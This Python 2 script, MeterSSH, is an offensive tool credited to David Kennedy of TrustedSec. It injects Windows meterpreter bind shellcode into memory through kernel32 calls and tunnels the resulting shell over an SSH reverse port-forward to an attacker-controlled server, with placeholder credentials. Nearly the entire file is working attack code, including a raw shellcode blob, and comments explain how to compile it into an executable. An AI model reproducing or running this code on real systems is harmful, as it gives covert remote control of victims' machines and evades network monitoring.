from socket import *
import paramiko
import multiprocessing
import time
import subprocess
import ctypes
import thread
import threading
import select

#####################################################################################
#
#                    MeterSSH
#           Tunneling Shellcode over SSH
#                   Version 1.0
#
#	Written by: David Kennedy (ReL1K)
#	Website: https://www.trustedsec.com
#	Twitter: @TrustedSec @HackingDave
#
# Simple add your username, password, remote IP, and remote port
# for your SSH server and watch the magic.
#
# Note that you can easily make this into a binary with pyinstaller or py2exe
#
#####################################################################################

# define our shellcode injection code through ctypes
def inject(shellcode):
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                       ctypes.c_int(len(shellcode)))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(shellcode)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))


# base socket handler for reverse SSH
def handler(chan, host, port):
    sock = socket()
    try:
        sock.connect((host, port))

    except Exception, e:
         print e
  
    while True:
        r, w, x = select.select([sock, chan], [], [])
        if sock in r:
            data = sock.recv(1024)
            if len(data) == 0:
                break
            chan.send(data)
        if chan in r:
            data = chan.recv(1024)
            if len(data) == 0:
                break
            sock.send(data)
    chan.close()
    sock.close()

# here is where we start the transport request for port forward on victim then tunnel over via thread and handler
def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):

        transport.request_port_forward('', server_port)
        # while we accept transport via thread handler continue loop
        while True:
                chan = transport.accept(1000)
                if chan is None:
                        continue

                thr = threading.Thread(target=handler, args=(chan, remote_host, remote_port))
                thr.setDaemon(True)
                # start thread
                thr.start()

# main class here
def main(user,password, rhost, port):
    server = [rhost, int(port)]  # our ssh server 
    remote = ['127.0.0.1', int(8021)] # what we want to tunnel
    client = paramiko.SSHClient() # use the paramiko SSHClient
    client.load_system_host_keys() # load SSH keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # automatically add SSH key

    try:
    	client.connect(server[0], server[1], username=user, key_filename=None, look_for_keys=False, password=password)

    # except exception
    except Exception, e:
    	print '*** Failed to connect to %s:%d: %r' % (server[0], server[1], e)
    try:
    	reverse_forward_tunnel(8021, remote[0], remote[1], client.get_transport())

    # except exception
    except Exception, e:
    	print e

if __name__ == '__main__':
    # used when you need to use multiprocessing and use pywin32 or py2exe and byte compile to a binary
    multiprocessing.freeze_support()
    # this is traditional metasploit windows/meterpreter/bind_tcp that binds on port 8021 - meterssh will then take port 8021 and wrap over SSH
    shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31\xdb\x53\x68\x02\x00\x1f\x55\x89\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
    shellcode = shellcode.decode("string_escape")
    shellcode = bytearray(shellcode)
    print "[*] Shellcode injection loaded into memory..."
    time.sleep(2)
    p = multiprocessing.Process(target=inject, args=(shellcode,))
    print "[*] Spawning meterpreter on localhost on port: 8021"
    jobs = []
    jobs.append(p)
    p.start()
    # this starts the main routine which is where we get all our port forward stuff
    # user for ssh - note that you can easily modify this to support pub/priv keys
    user = "sshuser"
    # password for SSH
    password = "sshpw"
    # this is where your SSH server is running
    rhost = "192.168.1.1"
    # remote SSH port - this is the attackers SSH server
    port = "22"
    print "[*] Tunneling SSH, this takes a moment."
    print "[*] You should have a shell raining in a sec.."
    time.sleep(3)
    thread.start_new_thread(main,(user,password, rhost, port,))

